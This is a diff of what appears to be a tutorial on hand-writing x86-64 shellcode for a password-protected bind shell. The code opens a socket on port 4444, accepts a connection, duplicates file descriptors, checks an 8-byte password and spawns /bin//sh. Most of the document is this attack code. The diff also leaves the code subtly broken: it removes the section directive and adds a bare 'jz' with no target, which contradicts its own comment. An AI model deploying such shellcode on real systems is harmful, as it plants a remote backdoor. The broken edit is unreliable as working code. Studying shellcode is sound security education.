@@ -102,11 +102,9 @@ Now that we are ready to start the actual Assembly code, let's create the skelet
 ```nasm
 global _start
 
-section .text
-
 _start:
 
-exit:
+Exec:
 
 ```
 
@@ -132,6 +130,8 @@ Type "help", "copyright", "credits" or "license" for more information.
 From the python output above, we can see that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So let's put together our first block of assembly code.
 
 ```nasm
+xor rdx, rdx ;Start with fresh registers
+xor rsi, rsi ;Start with fresh registers
 mov rax, 41 ;Syscall number for socket
 mov rdi, 2 ;Value for AF_INET
 mov rsi, 1 ;Value for SOCK_STREAM
@@ -177,7 +177,6 @@ bzero(&server.sin_zero, 8);
 ```nasm
 xor rax, rax ;zero out the rax register
 
-push rax ;push the 8 zero bytes, in rax, to the stack for bzero
 mov dword [rsp-4], eax ; move 4 bytes (because eax is the 32-bit part of rax) of 0's onto the stack (INADDR_ANY = int 0) at stack pointer - 4 bytes
 mov word [rsp-6], 0x5c11 ; move the port value onto the stack - 2 bytes
 mov word [rsp-8], 0x2 ;move the value 2 (for AF_INET) on the stack at stack pointer - 8 bytes
@@ -191,6 +190,7 @@ bind(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
 ```nasm
+xor rdx, rdx ;make sure rdx is 0
 mov rax, 49 ;syscall number for bind
 mov rsi, rsp ;mov rsp (pointer to our data structure) into rsi as second argument. Remember rdi is already set with the first argument
 mov rdx, 16 ; mov 16 into rdx for sockaddr_len. 8 zero bytes + 4 bytes INADDR_ANY + 2 bytes port + 2 bytes AF_INET = 16 bytes
@@ -226,8 +226,7 @@ For the client sockaddr Data Strucute we only need to reserve space on the stack
 mov rax, 43 ;syscall number for accept
 sub rsp, 16 ;move the stack pointer 16 bytes for client Data Structure
 mov rsi, rsp ;move the stack pointer to rsi as third argument 
-mov byte [rsp-1], 16 ;move the value 16 onto the stack for sockaddr_len
-sub rsp, 1 ;adjust the stack pointer to point to the value 16
+push 0x10 ;move the value 16 onto the stack for sockaddr_len
 mov rdx, rsp ;store rsp in rdx as third argument
 syscall ;syscall accept instruction
         
@@ -248,6 +247,8 @@ dup2(new_sock, 2);
 ```
 
 ```nasm
+xor rbx, rbx ;make sure rbx is 0
+xor rsi, rsi ;make sure rsi is 0
 mov rax, 33
 mov rdi, r9
 mov rsi, 0
@@ -295,12 +296,11 @@ if (strcmp(arguments[3], buf) == 0)
         mov rax, 0x7373736574796238 ;load password into rax in reverse order
         mov rdi, rsi ;load the 8 bytes received from the client into rdi
         scasq ;scasq will compare rax with rdi 
-        jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction
-
-exit:
+        jz ;if the two strings contained within rax and rdi match, then jump to our exec syscall instruction and if they do not match continue with exit syscall
         xor rax, rax ;zero out rax in case of any remnant values before attempting to exit
         mov rax, 60 ;syscall number for exit = 60
         syscall ;syscall exit instruction
+
 ```
 
 <h3>Stage 7 - Spawn the shell, if password is correct</h3>
@@ -345,22 +345,24 @@ execve(arguments[0], &arguments[0], NULL);
 ```
 
 ```nasm
-xor rax, rax ;zero out rax
-push rax ;push 8 zero bytes onto the stack for third argument 
 
-mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
-push rbx ;push the value onto the stack
+Exec:
+        xor rax, rax ;zero out rax
+        push rax ;push 8 zero bytes onto the stack for third argument 
 
-mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument
+        mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
+        push rbx ;push the value onto the stack
 
-push rax ; Lets add another 8 zero bytes on the stack
+        mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument
 
-mov rdx, rsp ; the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument
+        push rax ; Lets add another 8 zero bytes on the stack
 
-push rdi ; rdi is currently pointing to the address of /bin//sh so lets put that on the stack
-mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
-mov rax, 59 ;syscall number for execve
-syscall ;execve syscall instruction
+        mov rdx, rsp ; the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument
+
+        push rdi ; rdi is currently pointing to the address of /bin//sh so lets put that on the stack
+        mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
+        mov rax, 59 ;syscall number for execve
+        syscall ;execve syscall instruction
 ```
 
 Ok, that last part was quite a confusing bit, but after going over it a few times you should get it.
